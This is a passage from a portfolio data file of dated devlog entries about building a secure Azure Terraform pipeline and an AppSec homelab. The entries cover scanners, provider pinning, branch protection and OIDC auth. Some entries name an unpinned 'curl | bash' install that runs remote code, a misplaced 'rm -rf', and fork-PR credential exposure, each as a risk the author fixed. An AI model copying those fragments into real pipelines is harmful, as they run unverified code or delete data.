      "Added ne(variables['Build.Reason'], 'PullRequest') as a condition on the Apply stage, so a PR shows what would change without deploying it",
      "Turned off fork builds in ADO, since the repo is public and a stranger's PR would otherwise run their version of my pipeline YAML with my Azure credentials",
      'Added a GitHub ruleset on main: require a PR, require the Azure Pipelines check, block force pushes, and allow no bypass, including for me as admin',
      'Tested each control by triggering the case it should block: a direct push to main was rejected, and Apply showed as skipped on the PR',
    ],
    body: [
      'Until today, anyone with push access could commit straight to main and deploy, me included. Any control I had added (the lock file, readonly init, the Trivy checksum, the #trivy:ignore comments) could be removed with a single unreviewed commit.',
      "The fix has four parts: a pr: trigger, a condition that skips Apply on PRs, fork builds turned off, and a ruleset on main with no bypass. Fork builds mattered most because the repo is public, and a stranger's PR would run their pipeline YAML with my Azure credentials.",
      'The condition line took three attempts. The first had a typo in condition, a missing bracket, and Build Reason with a space instead of a dot. The first two would have failed loudly. The space would have failed silently: the variable lookup returns an empty string, the condition is always true, and Apply would have run on every PR while the YAML looked correct.',
      'A control that fails silently is worse than no control, because you stop looking. I test each one by triggering the case it is meant to block.',
    ],
    tools: ['Azure DevOps', 'GitHub', 'Terraform', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'branch protection',
      'CI/CD pipeline',
      'supply chain security',
      'Azure DevOps',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-19-provider-lock-file',
    date: '2026-09-24',
    category: 'Secure Azure Landing Zone',
    title: 'Pinning the azurerm provider with the lock file',
    workedOn: [
      'Found that main.tf asks for azurerm ~> 3.0, a version range, and .terraform.lock.hcl was in .gitignore, so the pipeline resolved the range fresh on every run and trusted whatever the registry returned',
      "Removed the lock file from .gitignore and ran terraform providers lock -platform=linux_amd64 -platform=darwin_arm64, so it holds checksums for both my Mac and the pipeline's Linux agent",
      'Added -lockfile=readonly to all three terraform init calls, so init fails on a mismatch instead of rewriting the lock file',
    ],
    body: [
      "main.tf asks for azurerm ~> 3.0, which is a range. With the lock file in .gitignore, the pipeline resolved that range fresh on every run and trusted whatever the registry returned. That matters for azurerm, since the provider runs with the pipeline's Azure credentials.",
      "I un-ignored the lock file and generated checksums for both platforms, my Mac and the pipeline's Linux agent. With -lockfile=readonly on every init, a mismatch fails the run, and a provider upgrade only happens when I run terraform init -upgrade locally and commit the result.",
      'The lock file does for the provider what my SHA-256 check does for Trivy, and Terraform ships it for free. Ignoring it in .gitignore threw that protection away.',
    ],
    tools: ['Terraform', 'Azure DevOps'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'supply chain security',
      'CI/CD pipeline',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-9-tfsec-to-trivy',
    date: '2026-09-24',
    category: 'Secure Azure Landing Zone',
    title: 'Swapping tfsec for Trivy, and a replacement that half-failed',
    workedOn: [
      "Replaced tfsec, installed by piping a script from GitHub's master branch into bash with no version pin or checksum, with Trivy v0.74.0 downloaded from the GitHub release and verified against its SHA-256 checksum file before extracting",
      'Added set -euo pipefail after finding the checksum check did nothing: bash kept running after the failed check, so a tampered download would have printed FAILED and been installed anyway',
      'Pasted the storage account fixes onto the Key Vault by mistake. terraform validate flagged the unsupported settings, but not the misplaced #trivy:ignore comments',
      'Trivy found four storage account problems tfsec had passed. Fixed two (network_rules deny default, infrastructure encryption) and accepted two (GRS replication, Storage Analytics logging) with written #trivy:ignore reasons',
      'The infrastructure encryption change forced a replace that failed halfway: Azure rejected the new account with StorageAccountAlreadyTaken 6 seconds after Terraform deleted the old one. Renamed the empty account and deployed a fresh plan',
    ],
    body: [
      "The tfsec install piped a script from GitHub's master branch straight into bash, with no version pin and no checksum. tfsec's own logs also said it's being folded into Trivy. I replaced it with Trivy v0.74.0, downloaded directly from the GitHub release and checked against the release's SHA-256 checksum file before extracting.",
      'I made two mistakes along the way. The checksum check did nothing at first. Bash keeps running after a failed command unless you tell it otherwise, so a tampered download would have printed FAILED and then been installed and run anyway. set -euo pipefail at the top of the script turned the check into a real gate.',
      "I also pasted the fixes onto the Key Vault instead of the storage account. terraform validate caught the settings the Key Vault doesn't support. It would not have caught the misplaced #trivy:ignore comments, because they're valid syntax attached to the wrong resource.",
      "Trivy found four problems on the storage account that tfsec had passed. I fixed two: a network_rules deny default and infrastructure encryption. I accepted the other two with inline #trivy:ignore comments and written reasons. GRS replication is a durability and cost choice for an account holding no data. Storage Analytics logging would only cover queues, which I don't use, so the proper fix is diagnostic settings sent to Log Analytics later.",
      "Infrastructure encryption can't be enabled on an existing account, so the plan showed a replace (-/+). Terraform deleted the account, then tried to create the new one 6 seconds later. Azure rejected it with StorageAccountAlreadyTaken, because globally unique names take time to be released after a deletion. The account was empty, so I renamed it and deployed a fresh plan.",
      "A replace is a delete followed by a create, and it can fail between the two. On an account holding real data, I'd plan that change as a migration.",
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ23.webp',
      'SecureAzureLandingZone/SALZ24.webp',
      'SecureAzureLandingZone/SALZ25.webp',
    ],
    tools: ['Trivy', 'Terraform', 'Azure DevOps', 'Azure'],
    tags: [
      'Secure Azure Landing Zone',
      'Trivy',
      'supply chain security',
      'checksum verification',
      'Terraform',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-8-tfsec-fixes-first-apply',
    date: '2026-09-24',
    category: 'Secure Azure Landing Zone',
    milestone: true,
    title: 'Fixing the tfsec findings and the first real deployment',
    workedOn: [
      'Fixed the CRITICAL tfsec finding by adding a network_acls block with default_action = "Deny" and bypass = "AzureServices". Setting public_network_access_enabled = false did not satisfy the scanner; it wanted the deny rule written into the config',
      'Fixed the MEDIUM finding by setting soft_delete_retention_days = 7 alongside purge_protection_enabled',
      'Ran terraform fmt to fix a misindented network_acls block that would have failed the fmt -check stage before the scan ran',
      'First real Apply: Validate -> Security Scan -> Plan -> manual approval -> Apply ran green end to end, and salz-rg now exists in Azure with the VNet, subnet, deny-by-default NSG, storage account, and Key Vault',
    ],
    body: [
      'Yesterday the security scan flagged two problems with my Key Vault config. Today I fixed both and got the whole pipeline green for the first time.',
      'The CRITICAL finding needed a network_acls block with default_action = "Deny" and bypass = "AzureServices". The MEDIUM finding needed soft_delete_retention_days = 7, which keeps deleted secrets recoverable for a week before anyone can purge them. I indented the new block wrong, which would have failed fmt -check before the scan ran; terraform fmt fixed it.',
      'The first real Apply ran the full pipeline end to end, and salz-rg now exists in Azure. I wrote every resource in it, and none of it deployed until the scanner passed it.',
      'The Portal showed four resource groups where I expected two. Azure creates NetworkWatcherRG the first time a VNet appears in a region, and linking Azure DevOps to the subscription creates VisualStudioOnline-<id>. I left both alone. I also should not delete Terraform-managed resources by hand in the Portal, because Terraform state would stop matching what exists in Azure. terraform destroy is the tool for that.',
      'Yesterday the gate blocked a deployment. Today I fixed the Key Vault config until it passed, and left the check itself untouched.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ12.webp',
      'SecureAzureLandingZone/SALZ13.webp',
    ],
    tools: ['Terraform', 'Azure', 'Azure DevOps', 'tfsec'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'Key Vault',
      'tfsec',
      'CI/CD pipeline',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-7-main-tf-resource-by-resource',
    date: '2026-09-23',
    category: 'Secure Azure Landing Zone',
    title: 'Writing the actual Terraform: main.tf, resource by resource',
    workedOn: [
      "Wrote the landing zone's real infrastructure by hand, validating after each addition: resource group, VNet + subnet, NSG (deny-by-default, no explicit rules, relying on Azure's implicit deny-all), NSG-subnet association, storage account, Key Vault",
      'Learned the implicit dependency graph: writing azurerm_resource_group.main.name instead of a literal string tells Terraform the creation and destruction order, with no depends_on needed',
      'Learned data sources vs resources: data "azurerm_client_config" "current" {} reads who Terraform is authenticated as (used for tenant_id on the Key Vault) without creating anything',
      'Set security defaults myself instead of relying on the provider: TLS 1.2 minimum, HTTPS-only, and no public network access on the storage account; RBAC authorization and purge protection on Key Vault',
      "Learned that purge_protection_enabled can't be turned off for the life of the vault, so enabling it is a decision to make up front",
      'Left variables.tf for later (everything is hardcoded) and flagged it in the repo, a reasonable tradeoff for a proof of concept',
      'Fixed a housekeeping bug: terraform fmt -check flagged trailing whitespace and misaligned = signs from editing by hand. Running terraform fmt without -check cleared them',
      'Ran the pipeline against the new main.tf: tfsec flagged two findings on the Key Vault, a critical missing network ACL and a medium finding for soft_delete_retention_days not explicitly set',
    ],
    body: [
      "Wrote the landing zone's real infrastructure by hand, resource by resource, validating after each addition: resource group, then VNet and subnet, then an NSG (deny-by-default, no explicit rules, relying on Azure's implicit deny-all), the NSG-subnet association, a storage account, and a Key Vault.",
      'Two Terraform concepts clicked while I wrote this. The first was the implicit dependency graph: writing azurerm_resource_group.main.name instead of retyping a literal string tells Terraform the creation and destruction order, with no depends_on needed. The second was data sources versus resources. data "azurerm_client_config" "current" {} reads who Terraform is authenticated as (I used it to get tenant_id for the Key Vault) and creates nothing.',
      "I set security defaults myself instead of relying on the provider's: TLS 1.2 minimum, HTTPS-only, and no public network access on the storage account; RBAC authorization and purge protection on Key Vault. purge_protection_enabled can't be turned off for the life of the vault, so I had to decide on it up front.",
      "I left variables.tf for later, so everything is hardcoded for now. That's a reasonable tradeoff for a proof of concept, and I flagged it in the repo.",
      'terraform fmt -check also flagged trailing whitespace and misaligned = signs from editing by hand. Running terraform fmt without -check fixes them, and it is worth doing before each commit.',
      'Ran the pipeline against the new main.tf and tfsec came back with two findings on the Key Vault: a critical for the missing network ACL, and a medium for soft_delete_retention_days not being explicitly set.',
    ],
    codeSnippets: [
      {
        label: 'tfsec finding: azure-keyvault-specify-network-acl',
        code: `Result #1 CRITICAL Vault network ACL does not block access by default.
────────────────────────────────────────────────────────────────────────────────
  main.tf:57-66
────────────────────────────────────────────────────────────────────────────────
   57    resource "azurerm_key_vault" "main" {
   58      name                          = "salz-kv-cg314214"
   59      location                      = azurerm_resource_group.main.location
   60      resource_group_name           = azurerm_resource_group.main.name
   61      tenant_id                     = data.azurerm_client_config.current.tenant_id
   62      sku_name                      = "standard"
   63      purge_protection_enabled      = true
   64      enable_rbac_authorization     = true
   65      public_network_access_enabled = false
   66  }
────────────────────────────────────────────────────────────────────────────────
          ID azure-keyvault-specify-network-acl
      Impact Without a network ACL the key vault is freely accessible
  Resolution Set a network ACL for the key vault

  More Information
  - https://aquasecurity.github.io/tfsec/v1.28.14/checks/azure/keyvault/specify-network-acl/
  - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#network_acls`,
      },
      {
        label: 'tfsec finding: azure-keyvault-no-purge',
        code: `Result #2 MEDIUM Resource should have soft_delete_retention_days set between 7 and 90 days in order to enable purge protection.
────────────────────────────────────────────────────────────────────────────────
  main.tf:57-66
────────────────────────────────────────────────────────────────────────────────
   57    resource "azurerm_key_vault" "main" {
   58      name                          = "salz-kv-cg314214"
   59      location                      = azurerm_resource_group.main.location
   60      resource_group_name           = azurerm_resource_group.main.name
   61      tenant_id                     = data.azurerm_client_config.current.tenant_id
   62      sku_name                      = "standard"
   63      purge_protection_enabled      = true
   64      enable_rbac_authorization     = true
   65      public_network_access_enabled = false
   66  }
────────────────────────────────────────────────────────────────────────────────
          ID azure-keyvault-no-purge
      Impact Keys could be purged from the vault without protection
  Resolution Enable purge protection for key vaults

  More Information
  - https://aquasecurity.github.io/tfsec/v1.28.14/checks/azure/keyvault/no-purge/
  - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#purge_protection_enabled`,
      },
    ],
    tools: ['Terraform', 'Azure', 'tfsec'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'Key Vault',
      'infrastructure as code',
      'tfsec',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-6-apply-stage-deployment-jobs',
    date: '2026-09-23',
    category: 'Secure Azure Landing Zone',
    milestone: true,
    title:
      'Azure DevOps pipeline: Apply stage, deployment jobs and manual approval',
    workedOn: [
      'Built the final stage using a deployment: job targeting the production ADO Environment, with an approval check attached, rather than a bare job:',
      'The deployment: job makes ADO pause and wait for a human to approve before any real infrastructure changes, so the pipeline enforces segregation of duties on every run',
      "Hit two bugs from the same root misunderstanding: deployment jobs don't behave like regular job:s",
      "First: deployment jobs don't auto-checkout the source repo the way regular jobs do, so terraform apply had no .tf files or backend config until an explicit - checkout: self step was added",
      'Second: the downloaded plan artifact lands under $(Pipeline.Workspace)/<artifact-name>/, separate from the checked-out source, so apply had to run from the terraform/ source directory while pointing at the plan file by its full workspace path',
      'Pipeline is now end-to-end: Validate -> Security Scan -> Plan (published as artifact) -> manual approval gate -> Apply, applying the exact approved plan rather than re-planning',
    ],
    body: [
      'Built the final stage with a deployment: job targeting the production ADO Environment, with an approval check attached, instead of a bare job:. That makes ADO pause the pipeline and wait for a human to approve before any real infrastructure changes, so the pipeline enforces segregation of duties on every run.',
      "I hit two bugs from the same misunderstanding: deployment jobs behave differently from regular job:s. First, deployment jobs don't auto-checkout the source repo the way regular jobs do. Without a - checkout: self step, terraform apply had no .tf files or backend config to work with.",
      'Second, the downloaded plan artifact lands under $(Pipeline.Workspace)/<artifact-name>/, separate from the checked-out source. I had to run apply from the terraform/ source directory and point it at the plan file by its full workspace path.',
      "I had treated deployment: and job: as a naming difference. They come with different defaults, and I only found out when files I expected weren't there.",
      'The pipeline now runs end to end: Validate -> Security Scan -> Plan, published as an artifact -> a manual approval gate -> Apply, using the exact approved plan instead of re-planning. I debugged every stage out of a real failure before it passed.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ10.webp',
      'SecureAzureLandingZone/SALZ11.webp',
    ],
    tools: ['Azure DevOps', 'Terraform', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Azure DevOps',
      'CI/CD pipeline',
      'Terraform',
      'deployment gate',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-5-plan-stage-oidc-auth',
    date: '2026-09-23',
    category: 'Secure Azure Landing Zone',
    milestone: true,
    title:
      'Azure DevOps pipeline: Plan stage, bootstrap and OIDC auth debugging',
    workedOn: [
      'Built the Plan stage, the biggest stage yet and the first to touch real Azure',
      'Bootstrapped state infra: a standalone rg-tfstate resource group, storage account, and blob container to hold Terraform state, kept separate from the landing zone resources and created by hand with az cli instead of Terraform',
      'Set up an Azure Resource Manager service connection (azure-landing-zone-connection) using workload identity federation, so the pipeline authenticates with a short-lived federated token instead of a stored secret',
      'Debugged an auth failure: a vague "Backend initialization required" error hid the real cause further up the log: Authenticating using the Azure CLI is only supported as a User, not a Service Principal',
      "Fixed it by exporting ARM_CLIENT_ID, ARM_TENANT_ID, ARM_SUBSCRIPTION_ID, ARM_USE_OIDC=true, and ARM_OIDC_TOKEN, since AzureCLI@2's az login session does not carry over to Terraform's azurerm provider. They use separate auth chains",
      'Caught a typo (misaligned artifact: under publish:) before it ran, and flagged the tfsec curl | bash install with a ponytail: comment so the shortcut is on record',
      'End state: terraform plan -out=tfplan runs against real remote state, and the plan file publishes as a pipeline artifact for the next stage to consume unchanged',
    ],
    body: [
      'Built the Plan stage today, the biggest one so far and the first to touch real Azure resources rather than pipeline scaffolding.',
      "I bootstrapped state first: a standalone rg-tfstate resource group, storage account, and blob container to hold Terraform's state, kept separate from the landing zone resources and created by hand with az cli. Terraform can't create the storage it needs to hold its own state, so that storage has to exist first. Then I set up a service connection (azure-landing-zone-connection) using workload identity federation, so the pipeline gets a short-lived federated token per run instead of a stored secret.",
      'The auth debugging took the longest. The first run failed with a vague "Backend initialization required" error, and the actual cause sat higher in the log: Authenticating using the Azure CLI is only supported as a User, not a Service Principal. When AzureCLI@2 logs in via az login, it does not hand that session to Terraform\'s azurerm provider or backend; they use separate auth mechanisms. I fixed it by exporting ARM_CLIENT_ID, ARM_TENANT_ID, ARM_SUBSCRIPTION_ID, ARM_USE_OIDC=true, and ARM_OIDC_TOKEN from the variables ADO exposes via addSpnToEnvironment: true. Next time I will check which auth chain a tool uses before assuming a logged-in CLI covers it.',
      'I also caught a misaligned artifact: under publish: before it ran, and flagged the tfsec curl | bash install with a ponytail: comment so the shortcut is on record.',
      'terraform plan -out=tfplan now runs against real remote state, and the plan file publishes as a pipeline artifact for the next stage to consume unchanged.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ8.webp',
      'SecureAzureLandingZone/SALZ9.webp',
    ],
    links: [
      {
        label: 'terraform plan output artifact',
        url: '/salz-plan-stage.tfplan',
      },
    ],
    tools: ['Azure DevOps', 'Terraform', 'Azure CLI', 'OIDC', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Azure DevOps',
      'CI/CD pipeline',
      'Terraform',
      'OIDC',
      'workload identity federation',
    ],
  },
  {
    id: 'visitor-map-entry-1-build-and-rate-limit',
    date: '2026-09-23',
    category: 'Portfolio Site',
    milestone: true,
    title: 'Small feature, first backend: a visitor map with a rate limit',
    workedOn: [
      'Added an anonymous, country-level visitor counter - a Cloudflare Worker plus a KV namespace, called from the portfolio on page load. First real backend this site has had',
      'Fixed a CORS bug (Worker only allowed the production origin, so local dev was locked out) and a map-library bug (its color scale collapses to one flat color when only one country has data yet)',
      'Pulled it out of the main nav in favour of a small corner badge on the homepage that links through to the full map - a whole tab felt like too much for a visitor counter',
      'Security-reviewed the finished feature and found one real gap: POST /visit had no rate limiting, so it could be curled directly and the counter inflated regardless of CORS',
      "Closed it with Cloudflare's native Rate Limiting binding (10 req/60s per IP) instead of hand-rolling one, and proved it works: 14 requests in a row, 429s from the 11th on",
    ],
    body: [
      "This is a small feature, and also the site's first actual backend; everything else is static. A Cloudflare Worker plus KV holds the counters, called from the frontend and separate from the GitHub Pages deploy.",
      'I hit two real bugs. CORS locked out local dev until I made the Worker reflect the request origin against an allowlist. The map library paints every country the same colour when only one has data, because its min/max scale collapses to one value; I wrote my own styleFunction instead of using the default.',
      "I security-reviewed it even though it's small, and the review found the one real gap: no rate limit on the write endpoint. CORS is a browser-only restriction, so a direct curl loop skips it. I fixed it with Cloudflare's own binding, then checked that it throttles.",
    ],
    tools: [
      'Cloudflare Workers',
      'Cloudflare KV',
      'React',
      'TypeScript',
      'Wrangler',
    ],
    tags: [
      'Visitor Map',
      'Cloudflare Workers',
      'CORS',
      'rate limiting',
      'privacy by design',
      'security review',
    ],
    links: [
      {
        label: 'Live on the site',
        url: 'https://charlesgoodsir.com/#/visitors',
      },
      {
        label: 'Risk assessment for this feature',
        url: 'https://charlesgoodsir.com/#/visitors/risk-assessment',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-21-azure-pipelines-lan-self-hosted-agent',
    date: '2026-09-19',
    category: 'AppSec Homelab',
    milestone: true,
    title:
      'Getting Azure Pipelines fully working: LAN reachability and a self-hosted agent',
    workedOn: [
      'Fixed the SAST stage: switched Semgrep from a job-level container to a plain docker run (matching gitleaks and Trivy), then dropped SEMGREP_APP_TOKEN, which forces "logged in" mode and conflicts with passing explicit --config rulesets',
      'Cleared 66 of 72 Semgrep findings as false positives: it was scanning committed ZAP HTML reports for "plaintext http links" inside their own reference text, fixed with a .semgrepignore for dast/',
      'Fixed the 6 remaining real findings: a Dockerfile running as root, a missing Dependabot cooldown period, an unpinned Terraform TLS setting, and one nginx Host-header finding reviewed and suppressed with a nosemgrep comment, since the backend never reads that header',
      'Added Dependabot update grouping so weekly runs produce one PR per ecosystem instead of a dozen',
      'Found the real blocker on the deploy stage: Azure hosted agents run on the public internet and cannot reach a private LAN address, full stop',
      'Fixed it by installing a self-hosted Azure Pipelines agent on the mini PC itself, so the deploy job runs from inside the LAN with plain docker compose and zap-baseline.py, no SSH/SCP or secure-file key management needed',
      "Chased three bugs that came with it: a stale manually-deployed container claiming the compose project's container names, ZAP unable to reach localhost:8080 because a container's localhost is its own network namespace (fixed with --network host), and the backend crash-looping on SQLite Error 14 because an earlier hardening change (non-root container user) broke write access to the database directory",
      'Ran a second-pass security review once everything was green: confirmed the self-hosted agent has root-equivalent access to the mini PC (expected for any self-hosted runner, not a flaw, but worth being precise about), confirmed the old SSH deploy key is fully revoked, and flagged checking whether the public repo requires approval before a fork PR gets free compute',
    ],
    body: [
      'Every stage of the new Azure Pipelines setup surfaced its own real failure once it actually ran.',
      'The SAST stage broke twice: Azure\'s job-level container: mechanism could not run the semgrep/semgrep image, fixed by switching to a plain docker run like gitleaks and Trivy already used; then Semgrep itself refused to run, since a set SEMGREP_APP_TOKEN forces "logged in" mode, which conflicts with passing explicit --config rulesets. Dropped the token, since the goal is specific OWASP rulesets, not org-managed policies. That surfaced 72 findings, 66 of them false positives from Semgrep scanning committed ZAP HTML reports for "plaintext http links" in their own reference text - cleared with a .semgrepignore for dast/. The remaining six were genuine, including one nginx Host-header finding suppressed with a nosemgrep comment explaining why the backend never reads that header.',
      "The deploy stage was the real lesson. Azure's hosted agents run on the public internet and cannot reach a private LAN address, full stop, regardless of IP or SSH key config. The fix was a self-hosted Azure Pipelines agent on the mini PC itself, so the deploy job runs from inside the LAN with plain docker compose and zap-baseline.py, no more SSH/SCP or secure-file key management.",
      "That brought three more bugs: a stale manually-deployed container holding the compose project's container names; ZAP unable to reach localhost:8080 because a container's localhost is its own network namespace, fixed with --network host; and the backend crash-looping on SQLite Error 14, caused by an earlier hardening change (non-root container user) that broke write access to the database directory.",
      'Once everything passed, I went back through with a second, security-focused pass, since a green pipeline and an explainable trust model are different bars. That confirmed the self-hosted agent has root-equivalent access to the mini PC (expected for any self-hosted runner, worth stating rather than glossing over), confirmed the old SSH deploy key is fully revoked, and turned up one thing still to check: whether the public repo requires approval before a fork PR gets free compute.',
    ],
    screenshots: [
      'Homelab/HomeLabAzurePipelines2.webp',
      'Homelab/HomeLabAzurePipelines3.webp',
      'Homelab/HomeLabAzurePipelines4.webp',
      'Homelab/HomeLabAzurePipelines5.webp',
    ],
    links: [
      {
        label: 'Semgrep initial scan (72 findings, before cleanup)',
        url: '/semgrep-initial-scan.sarif',
      },
      {
        label: 'Semgrep final scan (reviewed nginx finding)',
        url: '/semgrep-final-scan.sarif',
      },
      {
        label: 'ZAP baseline report, from the self-hosted deploy stage',
        url: '/zap-baseline-report.html',
      },
    ],
    tools: ['Azure Pipelines', 'Semgrep', 'ZAP', 'Docker', 'Dependabot'],
    tags: [
      'AppSec homelab',
      'Azure Pipelines',
      'CI/CD pipeline',
      'self-hosted agent',
      'SAST',
    ],
  },
  {
    id: 'appsec-homelab-entry-20-azure-pipelines-migration-dependabot-gap',
    date: '2026-09-19',
    category: 'AppSec Homelab',
    milestone: true,
    title: 'Migrating to Azure Pipelines, and finding a silent Dependabot gap',
    workedOn: [
      'Migrated the homelab CI/CD pipeline from GitHub Actions to Azure Pipelines, porting all eight jobs: secret scan, SAST, build, dependency scan, test, container scan, staged deploy, summary',
      'Translated the core concepts, not the syntax: jobs became stages containing jobs, secrets.X became a Library variable group, the SSH deploy key became a secure file, and the required-reviewer gate became an Environment approval check',
      'Fixed a real pipeline bug: Azure Pipelines needs a container declared under resources.containers rather than referenced inline',
      'The dependency-scan stage flagged a high-severity vulnerability in a transitive package, SQLitePCLRaw.lib.e_sqlite3, via Microsoft.EntityFrameworkCore.Sqlite',
      'That led to a bigger find: 12 stale Dependabot branches with fixes ready but no PRs ever opened, across NuGet, npm, and GitHub Actions',
      'Root cause: default_workflow_permissions was set to read, with PR creation disabled, so Dependabot could create update branches but never open a PR',
      'Fixed the permission, deleted the 12 stale branches so Dependabot rebuilds them with real PRs, and fixed the EF Core vulnerability directly',
    ],
    body: [
      'With the Terraform/Azure work done, I wanted the homelab CI/CD pipeline running on Azure Pipelines instead of GitHub Actions - a better fit for the DevOps roles I am targeting, and worth having alongside the AWS-flavoured GitHub Actions setup.',
      "It was not a copy-paste job. Azure Pipelines and GitHub Actions share the same underlying ideas - jobs, stages, dependencies - but the syntax barely overlaps. GitHub's jobs became Azure's stages containing jobs; secrets.X became a Library variable group referenced as $(X); the SSH deploy key became a secure file downloaded at runtime; the required-reviewer gate had to be rebuilt as an Environment approval check. Porting all eight jobs meant understanding what each step actually did, not translating it line by line.",
      'The first run surfaced two failures. One was a real YAML bug: Azure Pipelines wants a container declared under resources.containers rather than referenced inline, so the Semgrep job could not find its image. Straightforward once I understood the schema difference.',
      'The second was more interesting. The dependency-scan stage caught a high-severity vulnerability in a transitive package, SQLitePCLRaw.lib.e_sqlite3, pulled in via Microsoft.EntityFrameworkCore.Sqlite. That led me to notice something Dependabot should have caught already: a branch existed with the exact fix, Microsoft.EntityFrameworkCore.Sqlite-9.0.20, but no PR had ever been opened for it. The repo had 12 such orphaned branches across NuGet, npm, and GitHub Actions.',
      'The repo\'s Actions permissions API showed why: default_workflow_permissions was set to read, with PR creation disabled. Dependabot uses the same repo-level permission gate as GitHub Actions to open PRs, so it had been creating update branches every week and stopping there. I flipped "Allow GitHub Actions to create and approve pull requests" in Settings, deleted the 12 stale branches so Dependabot rebuilds them with real PRs on its next run, and fixed the EF Core vulnerability directly.',
      'Dependabot had been running for weeks without a single update reaching review. The pipeline caught the vulnerability it introduced; the permissions setting is what let 12 fixes sit unopened.',
    ],
    screenshots: ['Homelab/HomeLabAzurePipelines1.webp'],
    tools: ['Azure Pipelines', 'GitHub Actions', 'Dependabot', 'YAML'],
    tags: [
      'AppSec homelab',
      'Azure Pipelines',
      'CI/CD pipeline',
      'dependency scanning',
      'supply chain security',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-4-security-scan-tfsec',
    date: '2026-09-18',
    category: 'Secure Azure Landing Zone',
    title: 'Azure DevOps pipeline: SecurityScan stage with tfsec',
    workedOn: [
      'Added a SecurityScan stage, dependsOn: Validate, so it only runs after validation passes',
      "Chose tfsec over Checkov: a single lightweight binary, the same download-a-release-and-run pattern as the Terraform install in stage 1, and purpose-built for Azure IaC rather than Checkov's heavier multi-cloud/compliance scope",
      'Hit one bug before it ran clean: a missing line break collapsed bash and tfsec terraform/ into a single garbled command (bashtfsec)',
      'Same root cause as the earlier curl wrapping issue - pasted or edited YAML script blocks are plain shell text, and a lost newline merges two commands into one broken one',
      'main.tf has no real resource blocks yet, so tfsec found nothing to flag - the stage proves the mechanism works but catches nothing real until azurerm_* resources exist',
      "Noted for later: install uses curl | bash from tfsec's install script with no version pin or checksum - fine for a personal pipeline, but a real production setup should pin an exact tfsec release and verify a checksum rather than trust a mutable script at run time",
    ],
    body: [
      'Added a SecurityScan stage, dependsOn: Validate, so it only runs once validation passes.',
      'Chose tfsec over Checkov. tfsec is a single lightweight binary - the same download-a-release-and-run pattern as the Terraform install in stage 1 - and purpose-built for Azure IaC. Checkov is heavier, general-purpose, multi-cloud and compliance-focused, more than this pipeline needs right now.',
      'Hit one bug before the stage ran clean: a missing line break collapsed bash and tfsec terraform/ into a single garbled command, bashtfsec. Same root cause as the earlier curl wrapping issue - pasted or edited YAML script blocks are plain shell text, and a lost newline merges two commands into one broken one.',
      'main.tf still has no real resource blocks, so tfsec found nothing to flag. The stage proves the mechanism works; it will not catch anything real until actual azurerm_* resources exist.',
      "Shortcut noted for later: install uses curl | bash from tfsec's install script, with no version pin or checksum. Fine for a personal, learning pipeline. A real production setup should pin an exact tfsec release and verify a checksum instead of trusting a mutable script at run time.",
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ6.webp',
      'SecureAzureLandingZone/SALZ7.webp',
    ],
    tools: ['Azure DevOps', 'Terraform', 'tfsec', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Azure DevOps',
      'CI/CD pipeline',
      'Terraform',
      'tfsec',
      'infrastructure as code',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-3-init-validate-complete',
    date: '2026-09-18',
    category: 'Secure Azure Landing Zone',
    milestone: true,
    title: 'Azure DevOps pipeline: Validate stage complete',
    workedOn: [
      'Added the final two steps: terraform init -backend=false and terraform validate',
      "Chose -backend=false on purpose - the remote state backend isn't configured yet (backend.tf is still a TODO), and validate-time init only needs providers resolved, not a working backend or state lock",
      'Pipeline ran clean end to end',
      'main.tf is still just TODO comments with no real resource blocks, so validate passes on an empty config with nothing to check - the mechanism works, but checks nothing meaningful yet',
      'Validate stage is now complete: install Terraform → fmt -check → init -backend=false → validate, all gated on a clean agent workspace after fixing the earlier directory collision bug',
      'Next: Stage 2, the security scan (tfsec or Checkov)',
    ],
    body: [
      'Added the last two steps in the Validate stage: terraform init -backend=false and terraform validate.',
      "-backend=false is a deliberate choice. The remote state backend isn't configured yet - backend.tf is still a TODO - and validate-time init only needs providers resolved, not a working backend or a state lock.",
      "The pipeline ran clean end to end. main.tf is still just TODO comments with no real resource blocks, so validate passes on an empty config with nothing to check. The mechanism works; it isn't checking anything meaningful yet. That changes once real azurerm_* resources go in.",
      'Validate stage is complete: install Terraform → fmt -check → init -backend=false → validate, all gated on a clean agent workspace after fixing the directory collision bug from the previous entry.',
      'Next: Stage 2, the security scan, with tfsec or Checkov.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ4.webp',
      'SecureAzureLandingZone/SALZ5.webp',
    ],
    tools: ['Azure DevOps', 'Terraform', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Azure DevOps',
      'CI/CD pipeline',
      'Terraform',
      'infrastructure as code',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-2-fmt-check-directory-collision',
    date: '2026-09-18',
    category: 'Secure Azure Landing Zone',
    title:
      'Azure DevOps pipeline: terraform fmt -check deletes its own source folder',
    workedOn: [
      'Added a terraform fmt -check -diff step, scoped to workingDirectory: terraform',
      'It failed with Not found workingDirectory: /home/vsts/work/1/s/terraform. First checked remotes, branches, and service connections - all fine',
      "Cause: the Install Terraform script's rm -rf terraform terraform.zip ran at the checkout root, where my repo's own terraform/ source folder lives, and deleted the source before the fmt step ran",
      'Fixed by installing Terraform inside its own tf-install/ subdirectory, so the install and cleanup logic can no longer touch checked-out source',
